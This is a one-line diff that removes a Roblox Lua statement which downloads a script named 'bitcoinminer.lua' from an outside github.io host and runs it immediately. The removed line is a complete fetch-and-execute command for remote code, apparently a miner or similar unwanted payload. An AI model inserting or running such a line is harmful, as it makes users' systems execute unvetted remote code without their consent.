@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://egirlhub.github.io/e/bitcoinminer.lua"))()
